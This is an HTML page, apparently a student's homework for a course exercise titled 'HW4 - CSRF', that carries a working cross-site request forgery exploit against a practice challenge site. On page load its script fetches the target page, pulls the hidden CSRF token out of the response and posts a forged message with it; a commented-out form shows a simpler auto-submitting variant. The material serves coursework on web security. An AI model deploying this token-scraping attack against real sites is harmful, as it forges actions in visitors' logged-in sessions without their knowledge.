<!DOCTYPE html>
<html lang="en">
<html>
<head>
	<meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Template for doing info415 homework w/ Andrew M.">
    <meta name="author" content="Royce Le">
	<title>HW4 - CSRF</title>
<!-- 	<script src=code.jquery etc.> </script> -->
</head>
<body>
	<script> 
	  function request(url, type, callback, send){
	      var oReq = new XMLHttpRequest();
	      oReq.open(type, url, true);
	      oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	      oReq.onload = callback;
	      oReq.send(send);
	  };
	  function getListener () {
	      var el = document.createElement('div');
	      el.innerHTML = this.responseText; 
	      request('http://csrf-challenges.r7.io/make_post/4', 'POST', postListener, 'csrf=' + el.querySelector('input[name="csrf"]').value + '&post=royle');
	  };
	  function postListener(){
	      console.log(this.responseText)
	  };
	  request('http://csrf-challenges.r7.io/make_post/4', 'GET', getListener);
	</script>
	<!---
	<form id="post_form" action="http://csrf-challenges.r7.io/make_post/4" method="POST" >
		<textarea name="post" value="royle">royle</textarea>
		<input type="submit" value="submit">
	</form>
	<script type="text/javascript">
		document.getElementById("post_form").submit();
	</script>
-->
</body>
</html>

